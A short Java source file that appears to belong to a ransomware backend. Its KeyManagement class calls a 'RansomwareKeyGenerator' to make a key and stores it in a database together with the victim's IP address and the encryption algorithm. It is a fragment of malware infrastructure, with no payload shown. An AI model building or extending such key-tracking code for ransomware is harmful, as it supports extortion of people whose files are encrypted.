package keys;

import javax.inject.Inject;

import repositories.KeyRepository;
import entities.CryptoKey;

public class KeyManagement<T> {
	@Inject
	private KeyRepository repository;

	public T createKey(String encalgo, String ip) {
		RansomwareKeyGenerator<T> clientKey = new RansomwareKeyGenerator<T>();
		T key = (T) clientKey.keyMaker(encalgo);
		save((CryptoKey<T>) new CryptoKey<T>(ip, key, encalgo)); // Save to DB
		return (T) key;

	}

	public void save(CryptoKey<T> entity) {
		repository.save(entity);

	}

}
